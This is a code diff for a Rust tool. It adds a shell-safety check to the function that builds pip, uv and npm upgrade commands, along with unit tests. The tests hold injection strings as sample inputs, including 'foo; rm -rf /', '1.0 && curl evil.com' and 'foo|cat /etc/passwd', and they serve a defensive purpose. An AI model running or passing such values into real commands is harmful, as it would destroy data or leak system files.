@@ -155,7 +155,18 @@ pub fn package_id(kind: CacheKind, path: &Path) -> Option<PackageId> {
     }
 }
 
+/// Sanitize a string for safe use in a shell command.
+/// Rejects names containing shell metacharacters.
+fn is_safe_for_shell(s: &str) -> bool {
+    !s.is_empty()
+        && s.bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b"-_./@".contains(&b))
+}
+
 pub fn upgrade_command(kind: CacheKind, name: &str, version: &str) -> Option<String> {
+    if !is_safe_for_shell(name) || !is_safe_for_shell(version) {
+        return None;
+    }
     match kind {
         CacheKind::Pip => Some(format!("pip install {name}>={version}")),
         CacheKind::Uv => Some(format!("uv pip install {name}>={version}")),
@@ -412,5 +423,92 @@ mod tests {
                 kind
             );
         }
+    }
+
+    // --- Shell safety in upgrade_command ---
+
+    #[test]
+    fn upgrade_command_rejects_shell_injection_in_name() {
+        assert_eq!(
+            upgrade_command(CacheKind::Pip, "foo; rm -rf /", "1.0"),
+            None
+        );
+    }
+
+    #[test]
+    fn upgrade_command_rejects_shell_injection_in_version() {
+        assert_eq!(
+            upgrade_command(CacheKind::Npm, "express", "1.0 && curl evil.com"),
+            None
+        );
+    }
+
+    #[test]
+    fn upgrade_command_rejects_backtick_substitution() {
+        assert_eq!(upgrade_command(CacheKind::Pip, "`whoami`", "1.0"), None);
+    }
+
+    #[test]
+    fn upgrade_command_rejects_dollar_substitution() {
+        assert_eq!(upgrade_command(CacheKind::Pip, "$(whoami)", "1.0"), None);
+    }
+
+    #[test]
+    fn upgrade_command_rejects_pipe() {
+        assert_eq!(
+            upgrade_command(CacheKind::Pip, "foo|cat /etc/passwd", "1.0"),
+            None
+        );
+    }
+
+    #[test]
+    fn upgrade_command_rejects_empty_name() {
+        assert_eq!(upgrade_command(CacheKind::Pip, "", "1.0"), None);
+    }
+
+    #[test]
+    fn upgrade_command_allows_scoped_npm() {
+        assert_eq!(
+            upgrade_command(CacheKind::Npm, "@types/node", "22.0.0"),
+            Some("npm install @types/node@22.0.0".to_string())
+        );
+    }
+
+    #[test]
+    fn upgrade_command_allows_dotted_names() {
+        assert_eq!(
+            upgrade_command(CacheKind::Pip, "python-dateutil", "2.9.0"),
+            Some("pip install python-dateutil>=2.9.0".to_string())
+        );
+    }
+
+    #[test]
+    fn upgrade_command_allows_underscored_names() {
+        assert_eq!(
+            upgrade_command(CacheKind::Pip, "typing_extensions", "4.12.0"),
+            Some("pip install typing_extensions>=4.12.0".to_string())
+        );
+    }
+
+    // --- is_safe_for_shell ---
+
+    #[test]
+    fn is_safe_for_shell_allows_normal_names() {
+        assert!(is_safe_for_shell("requests"));
+        assert!(is_safe_for_shell("flask-restful"));
+        assert!(is_safe_for_shell("@babel/core"));
+        assert!(is_safe_for_shell("1.2.3"));
+    }
+
+    #[test]
+    fn is_safe_for_shell_rejects_dangerous_chars() {
+        assert!(!is_safe_for_shell(";"));
+        assert!(!is_safe_for_shell("a b"));
+        assert!(!is_safe_for_shell("$(cmd)"));
+        assert!(!is_safe_for_shell("`cmd`"));
+        assert!(!is_safe_for_shell("a|b"));
+        assert!(!is_safe_for_shell("a&b"));
+        assert!(!is_safe_for_shell("a\nb"));
+        assert!(!is_safe_for_shell(""));
     }
 }
